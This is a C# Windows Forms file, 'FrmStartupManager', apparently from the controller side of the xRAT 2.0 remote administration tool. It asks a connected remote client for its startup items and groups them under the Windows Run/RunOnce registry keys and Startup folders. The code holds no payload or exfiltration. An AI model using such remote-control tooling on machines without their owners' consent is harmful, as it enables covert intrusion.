using System.Windows.Forms;
using xServer.Core;
using xServer.Core.Misc;

namespace xServer.Forms
{
    public partial class FrmStartupManager : Form
    {
        private readonly Client _connectClient;
        private readonly ListViewColumnSorter _lvwColumnSorter;

        public FrmStartupManager(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmStm = this;
            InitializeComponent();

            _lvwColumnSorter = new ListViewColumnSorter();
            lstStartupItems.ListViewItemSorter = _lvwColumnSorter;
        }

        private void FrmStartupManager_Load(object sender, System.EventArgs e)
        {
            if (_connectClient != null)
            {
                this.Text = string.Format("xRAT 2.0 - Startup Manager [{0}:{1}]",
                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
                AddGroups();
                new Core.Packets.ServerPackets.GetStartupItems().Execute(_connectClient);
            }
        }

        private void AddGroups()
        {
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
            lstStartupItems.Groups.Add(
                new ListViewGroup("COMMONAPPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
            lstStartupItems.Groups.Add(new ListViewGroup("APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        }

        private void FrmStartupManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_connectClient.Value != null)
                _connectClient.Value.FrmStm = null;
        }

        private void lstStartupItems_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == _lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (_lvwColumnSorter.Order == SortOrder.Ascending)
                    _lvwColumnSorter.Order = SortOrder.Descending;
                else
                    _lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                _lvwColumnSorter.SortColumn = e.Column;
                _lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstStartupItems.Sort();
        }
    }
}